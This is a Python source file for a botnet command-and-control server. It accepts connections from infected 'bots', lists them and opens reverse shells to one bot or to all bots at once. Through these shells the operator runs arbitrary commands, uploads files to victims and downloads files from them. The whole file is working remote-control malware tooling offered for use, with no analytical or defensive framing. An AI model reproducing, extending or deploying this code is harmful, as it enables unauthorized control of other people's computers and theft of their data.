#!/usr/bin/python3
import queue
import socket
import threading
from queue import Queue
import os
import json
import base64
import sys
import signal


# HOST and port for bots to connect
HOST = ''
PORT = 0

queue = Queue()
#STOP = False    #To stop the whole program
TERMINAL = "MAIN"    # To print the appropriate starting text when the connection is recieved
JOBS = [1,2]    # 1 = Accept Infinite loop and 2 = Terminal Infinite loop
NUMBER_OF_THREADS = 2   # Creating 2 Threads one for Accept infinite loop and other for terminal infinite loop
CONNECTION_CONN = []    # Storing the clients sockets
CONNECTION_ADDR = []    # Storing the clients address and port

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST,PORT))

s.listen(100) # Number of incoming connections


def usage():
    use1 = """
select [connection number] -> to select a connection  e.g. select 0
list                       -> to list the active connections
clear                      -> to clear the screen
control_all                -> to enter the shell to control all active connections
exit                       -> to exit the program
help                       -> help menu
"""
    
    use2 = """
background                  -> Go back to main shell
exit                        -> Go back to main shell
clear                       -> to clear the screen
upload [filename]           -> to upload a particular file  e.g. upload hello.txt
download [filename]         -> to download a particular file e.g. download hello.txt
start [path/command]        -> to run a particular program
help                        -> help menu
You can send commands to the client by just entering it and the corresponding reponse will be displayed
E.g. dir/ls then the response will be the list of the directory for Windows/Linux
"""

    use3 = """
background                  -> Go back to main shell
exit                        -> Go back to main shell
clear                       -> to clear the screen
upload [filename]           -> to upload a particular file to all clients e.g. upload hello.txt
help                        -> help menu
You can send commands to the clients by just entering it and it will be executed on all the clients one by one you wont recieve any output of this
"""

    if TERMINAL == "MAIN":
        print(use1)
    elif TERMINAL == "REV":
        print(use2)
    else:
        print(use3)

def CLOSED(signal,frame):
    for i in CONNECTION_CONN:
        Send_Assist('exit',i)   # Closing the connection and sending exit for persistence
        i.close()
    del(CONNECTION_ADDR[:]) # Deleting the Connection socket and addr of the client
    del(CONNECTION_CONN[:])
    s.close()
    if signal == 1:
        print("[-] Press Ctrl+C to exit")
    else:
        print("\n[-] Exiting")
    sys.exit(0) # Exiting the program

# Sending and recving data more than buffer size
def Send_Assist(data,conn):
    try:
        send_data = json.dumps(data)
        conn.send(send_data.encode())
    except:
        return "died"

def Recv_Assist(conn):
    data = ""
    while True:
        try:
            temp = conn.recv(1024).decode()
            if temp.strip() == '':
                return ""
            else:
                data += temp
            return json.loads(data)
        except ValueError as f:
            print(f)
            continue

def list_Clients():
    Clients = "" # Storing the Clients from the CONNECTION_CONN list
    Clients += "------------- Clients -------------\n"
    died_bots = []  # List of died bots to remove 
    if len(CONNECTION_CONN) > 0:
        for i in range(len(CONNECTION_CONN)):
            try:
                check = Send_Assist("Just Checking!!",CONNECTION_CONN[i])    #Checking if the bot is still alive
                if check == "died" : raise Exception
                else: temp = Recv_Assist(CONNECTION_CONN[i])
                check = Send_Assist("Just Checking!!",CONNECTION_CONN[i])    #Checking if the bot is still alive
                if check == "died" : raise Exception
                else: temp = Recv_Assist(CONNECTION_CONN[i])
            except Exception as e:
                died_bots.append(i)
        died_bots.sort(reverse=True)    # Sorting in descending for del function
        for i in died_bots: # Deleting the died connections
            del(CONNECTION_CONN[i])
            del(CONNECTION_ADDR[i])
        for i in range(len(CONNECTION_CONN)):
            Clients += "{0}  {1}:{2}\n".format(i,CONNECTION_ADDR[i][0],CONNECTION_ADDR[i][1])   # Appending the connections to display
    print(Clients)  

def check_Client(client):
    try:
        client = int(client)
        if client < len(CONNECTION_CONN):   # If the connection number is greater then the length of CONN list its not valid
            try:
                Send_Assist("Just Checking!!",CONNECTION_CONN[client])    #Checking if the bot is still alive
                temp = Recv_Assist(CONNECTION_CONN[client])
                Send_Assist("Just Checking!!",CONNECTION_CONN[client])    #Checking if the bot is still alive
                temp = Recv_Assist(CONNECTION_CONN[client])
                return True
            except:
                del(CONNECTION_CONN[client])    #If bot is dead remove it from the list and return false
                del(CONNECTION_ADDR[client])
                print("[-] Connection lost from the remote bot")
                return False
        else:
            print("[-] Enter a valid connection")
            return False
    except:
        print("[-] Enter a valid connection")
        return False

def Terminal():
    global TERMINAL
    while True:
        TERMINAL = "MAIN"

        n = input("CNC:~# ")
        if n == "list":
            list_Clients()
        elif 'select' in n:
            n = n.split()
            if len(n) > 2 or check_Client(n[-1]):
                Addr = CONNECTION_ADDR[int(n[-1])]
                print("[+] Connected to {0}:{1}".format(Addr[0],Addr[1]))
                Rev_Shell(CONNECTION_CONN[int(n[-1])])
        elif n == 'clear':
            done = os.system('clear')
        elif n == 'exit':
            CLOSED(1,2)
        elif n == 'control_all':
            All_Rev_Shell()
        elif n == "help":
            usage()
        else:
            print("[-] Command not found use help for help menu")

def Rev_Shell(conn):
    global TERMINAL
    while True:
        try:
            TERMINAL = "REV"
            n = input("BOT:~# ")
            if n == 'background' or n == 'exit':   # Returning yo the Terminal loop
                break
            elif n == 'clear':
                done = os.system('clear')
            elif n[:6] == 'upload':
                if len(n.split()) == 2:
                    if os.path.exists(n[7:]):
                        try:
                            check = Send_Assist(n,conn)
                            if check == "died" : raise Exception
                            with open(n[7:],'rb') as f:
                                file_data = base64.b64encode(f.read()).decode() # Encoding the file data
                                check = Send_Assist(file_data,conn)
                                if check == "died" : raise Exception
                        except Exception as e:
                            print(e)
                            print("[-] Something went wrong while uploading")
                    else:
                        print("[-] File doesn't exits")
                else:
                    print("[-] you can only upload one file at a time")
            elif n[:8] == 'download':
                if len(n.split()) == 2:
                    check = Send_Assist(n,conn)
                    if check == "died" : raise Exception
                    data = Recv_Assist(conn)
                    if data == "[+] True":
                        name = os.path.basename(n[9:])
                        with open(name,'wb') as f:
                            try:
                                file_data = Recv_Assist(conn)
                                print(file_data)
                                file_data = base64.b64decode(file_data)
                                print(file_data)
                                f.write(file_data)
                            except:
                                print("[-] Something went wrong while downloading the file",s)
                    else:
                        print(data)
                else:
                    print("[-] you can only download one file at a time")
            elif n[:5] == 'start':
                check = Send_Assist(n,conn)
                if check == "died": raise Exception
                answer = Recv_Assist(conn)
                print(answer)
            elif n == "help":
                usage()
            elif len(n) > 0:
                try:    # Sending commands and recieving its output
                    check = Send_Assist(n,conn)
                    if check == "died" : raise Exception
                    answer = Recv_Assist(conn)
                    print(answer)
                except:
                    print("[-] Connection lost from the remote bot")
                    break
        except Exception as e:
            print("[-] Connection lost from the remote bot")
            break

#Rev Shell for all connections

def All_Rev_Shell():
    global TERMINAL
    TERMINAL = "ALL"
    while True:
        try:
            n = input("BOT@All~:# ")
            if n == "background" or n == "exit":
                break
            elif n == 'clear':
                done = os.system('clear')
            elif n[:6] == 'upload':
                uploaded_success = []
                if len(n.split()) == 2:
                    if os.path.exists(n[7:]):
                        for i in CONNECTION_CONN:
                            try:
                                check = Send_Assist(n,i)
                                if check == "died" : raise Exception
                                with open(n[7:],'rb') as f:
                                    file_data = base64.b64encode(f.read()).decode() # Encoding the file data
                                    check = Send_Assist(file_data,i)
                                    try:
                                        if check == "died" : raise Exception
                                    except Exception as e:
                                        continue
                                    else:
                                        index = CONNECTION_CONN.index(i)
                                        uploaded_success.append("{0}:{1}".format(CONNECTION_ADDR[index][0],CONNECTION_ADDR[index][1]))
                            except:
                                print("[-] Something went wrong while uploading")
                        print("Successfully uploaded to")
                        for i in uploaded_success:
                            print(i)
                    else:
                        print("[-] File doesn't exits")
                else:
                    print("[-] you can only upload one file at a time")
            elif n == 'help':
                usage()
            elif len(n) > 0:
                n = "start " + n
                uploaded_success = []
                for i in CONNECTION_CONN:
                    try:    # Sending commands and recieving its output
                        check = Send_Assist(n,i)
                        try:
                            if check == "died" : raise Exception
                        except Exception as e:
                            continue
                        else:
                            index = CONNECTION_CONN.index(i)
                            uploaded_success.append("{0}:{1}".format(CONNECTION_ADDR[index][0],CONNECTION_ADDR[index][1]))
                        answer = Recv_Assist(i)
                    except:
                        print("[-] Connection lost from the remote bot")
                        continue
                print("Command succesfullt executed on")
                for i in uploaded_success:
                    print(i)
        except Exception as e:
            print(e)
            print("[-] Connection lost from the remote bot")

def Accept():
    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)
            CONNECTION_CONN.append(conn)
            CONNECTION_ADDR.append(addr)
            print("\n[+] Connection Recieved from ", addr[0], addr[1])
            if TERMINAL == "MAIN":  # Printing the previous terminal prompt after recieving connection
                print("\rCNC:~# ",end="")
            elif TERMINAL == "REV":
                print("\rBOT:~# ",end="")
            else:
                print("\rBOT@All~:# ",end="")
        except:
            print('[-] Something went wrong while recieving connection')

# Creating 2 Threads for 2 infinite loops
def start():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=Create_Shells)
        t.daemon = True
        t.start()

# Calling the infinite loops
def Create_Shells():
    while True:
        shell = queue.get()
        if shell == 1:
            Accept()
        if shell == 2:
            Terminal()
        queue.task_done()
        break
# Selecting the infinite loops
def Select_Shell():
    for i in JOBS:
        queue.put(i)
    queue.join()

if __name__ == '__main__':
    signal.signal(signal.SIGINT, CLOSED)
    start()
    Select_Shell()